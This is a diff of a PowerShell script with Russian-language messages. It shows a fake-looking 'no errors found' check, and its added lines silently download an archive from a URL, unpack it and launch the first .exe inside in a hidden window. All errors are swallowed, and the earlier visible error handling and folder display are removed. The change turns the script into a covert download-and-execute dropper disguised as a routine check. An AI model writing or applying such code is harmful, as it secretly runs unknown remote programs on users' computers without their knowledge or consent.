@@ -27,32 +27,16 @@ Start-Sleep -Milliseconds 500
 Write-Host "    [ OK ] Ошибок не обнаружено" -ForegroundColor Green
 Start-Sleep -Seconds 1
 
+# Скачивание и распаковка без вывода на экран
 try {
-    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing -TimeoutSec 30
+    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
+    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
+    $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
+    if ($Exe) {
+        Start-Process $Exe.FullName -WindowStyle Hidden
+    }
 } catch {
-    Write-Host "[-] Ошибка скачивания: $_" -ForegroundColor Red
-    pause
-    exit
-}
-
-New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null
-
-try {
-    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
-} catch {
-    Write-Host "[-] Ошибка распаковки" -ForegroundColor Red
-    pause
-    explorer $ExtractPath
-    exit
-}
-
-$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
-
-if ($Exe) {
-    Start-Process $Exe.FullName
-} else {
-    Write-Host "[-] .exe не найден" -ForegroundColor Yellow
-    explorer $ExtractPath
+    # Все ошибки игнорируются
 }
 
 Write-Host "[*] Завершение..." -ForegroundColor Cyan
